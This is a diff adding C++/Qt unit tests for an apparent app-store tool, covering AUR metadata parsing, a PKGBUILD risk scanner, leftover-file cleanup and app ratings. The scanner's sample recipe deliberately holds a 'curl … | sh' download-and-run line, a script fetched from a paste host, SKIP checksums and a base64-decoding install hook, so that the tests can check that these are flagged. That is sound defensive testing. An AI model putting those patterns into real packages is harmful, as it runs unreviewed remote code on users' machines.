@@ -9,6 +9,9 @@
 #include "backend.h"
 #include "catalog.h"
 #include "merge.h"
+#include "review.h"
+#include "leftovers.h"
+#include "ratings.h"
 
 static void await(QEventLoop &loop, bool &done, int milliseconds = 3000) {
     QTimer timeout;
@@ -202,4 +205,51 @@ int main(int argc, char **argv) {
     assert(rankSearch(searchable, "browser", searchScores) == QList<int>({2, 0}));  // summary matches, more popular first
     assert(rankSearch(searchable, "internet", searchScores) == QList<int>{2} && rankSearch(searchable, "  ", searchScores).isEmpty());
     std::puts("Ranking and search checks: PASS");
+
+    const auto info = parseAurInfo(R"({"resultcount":1,"results":[{"Name":"foo-bin","PackageBase":"foo","Maintainer":null,"NumVotes":3,"Popularity":0.5,"FirstSubmitted":1700000000,"LastModified":1790000000,"OutOfDate":null,"URL":"https://foo.example"}]})", &ok);
+    assert(ok && info.base == "foo" && info.maintainer.isEmpty() && info.votes == 3 && info.firstSubmitted.isValid() && !info.outOfDate.isValid());
+    parseAurInfo(R"({"resultcount":0,"results":[]})", &ok);
+    assert(!ok);
+    const QString recipe = "\n──── PKGBUILD ────\n# curl is fine in a comment\nsource=(\"https://github.com/other/foo/archive/v$pkgver.tar.gz\" \"https://paste.example/x.sh\")\nsha256sums=('SKIP' 'SKIP')\nbuild() {\n  curl -s https://x.example/a | sh\n  npm install\n}\n"
+                           "\n──── foo.install ────\npost_install() { echo $(echo aGk= | base64 -d); }\n\n──── .SRCINFO ────\npkgbase = foo\n";
+    const QStringList flags = reviewFlags(recipe, "https://github.com/real/foo");
+    auto flagged = [&flags](const QString &text) { for (const auto &f : flags) if (f.contains(text)) return true; return false; };
+    assert(flagged("foo.install is an install script") && flagged("PKGBUILD:5 downloads") && flagged("pipes data into a shell") && flagged("language package manager"));
+    assert(flagged("foo.install:1 decodes") && flagged("a different account") && flagged("paste.example") && flagged("2 checksum(s) are SKIP"));
+    assert(!flagged("PKGBUILD:1"));  // comments are ignored
+    assert(reviewFlags("\n──── PKGBUILD ────\nsource=(\"git+https://github.com/real/foo.git\")\nsha256sums=('SKIP')\n", "https://github.com/real/foo").isEmpty());
+    QTemporaryDir reviewedDir;
+    assert(saveReviewed(reviewedDir.path(), "foo", "abc123", recipe) && loadReviewed(reviewedDir.path(), "foo", nullptr) == recipe);
+    QString savedCommit; loadReviewed(reviewedDir.path(), "foo", &savedCommit);
+    assert(savedCommit == "abc123" && loadReviewed(reviewedDir.path(), "missing").isEmpty() && !saveReviewed(reviewedDir.path(), "../x", "c", "r"));
+    std::puts("AUR review checks: PASS");
+
+    QTemporaryDir fakeHome;
+    auto touch = [&fakeHome](const QString &relative) {
+        QDir().mkpath(QFileInfo(fakeHome.path() + '/' + relative).absolutePath());
+        QFile file(fakeHome.path() + '/' + relative); assert(file.open(QIODevice::WriteOnly)); file.write("12345");
+    };
+    touch(".config/Krita/a.conf"); touch(".config/kritarc"); touch(".cache/krita/x"); touch(".local/share/krita/y"); touch(".local/share/applications/krita.desktop");
+    touch(".config/other/z"); touch(".var/app/org.kde.krita/data/d"); touch(".config/icons/i");
+    const auto left = findLeftovers(fakeHome.path(), {"krita", "icons", "go"});
+    QStringList kinds;
+    for (const auto &item : left) kinds << item.kind + ':' + QFileInfo(item.path).fileName() + (item.checkedByDefault ? "*" : "");
+    kinds.sort();
+    assert(kinds == QStringList({"Cache:krita*", "Data:krita", "Settings:Krita", "Settings:kritarc"}));  // not applications/, icons/, other/
+    assert(left.first().bytes > 0 && flatpakData(fakeHome.path(), "org.kde.krita").size() == 1 && flatpakData(fakeHome.path(), "org.none").isEmpty() && flatpakData(fakeHome.path(), "../x").isEmpty());
+    assert(!deleteLeftover(fakeHome.path(), "/etc/hostname") && !deleteLeftover(fakeHome.path(), fakeHome.path() + "/../x"));
+    QFile::link(fakeHome.path() + "/.config/other", fakeHome.path() + "/.config/linked");
+    assert(deleteLeftover(fakeHome.path(), fakeHome.path() + "/.config/linked") && QFileInfo::exists(fakeHome.path() + "/.config/other/z"));  // link only
+    assert(deleteLeftover(fakeHome.path(), fakeHome.path() + "/.cache/krita") && !QFileInfo::exists(fakeHome.path() + "/.cache/krita"));
+    assert(deleteLeftover(fakeHome.path(), fakeHome.path() + "/.var/app/org.kde.krita") && !QFileInfo::exists(fakeHome.path() + "/.var/app/org.kde.krita"));
+    std::puts("Leftover checks: PASS");
+
+    Ratings rated;
+    parseOdrs(R"({"star0":0,"star1":0,"star2":0,"star3":0,"star4":5,"star5":5,"total":10})", &rated);
+    assert(rated.reviews == 10 && qAbs(rated.stars - 4.5) < 0.001);
+    Ratings few; parseOdrs(R"({"star5":2,"total":2})", &few); assert(few.reviews == 0 && !few.any());  // Too few reviews: no stars
+    parseFlathubStats(R"({"installs_total":1781622,"installs_last_month":35610})", &few); assert(few.installs == 1781622 && few.any());
+    const Rankings recent = parseRankings({}, {}, {}, R"({"hits":[{"app_id":"a.b.New"}]})", R"({"hits":[{"app_id":"a.b.Fresh"},{"app_id":"c.d.Fresh"}]})");
+    assert(recent.added == QStringList{"a.b.New"} && recent.updated.size() == 2);
+    std::puts("Ratings checks: PASS");
 }
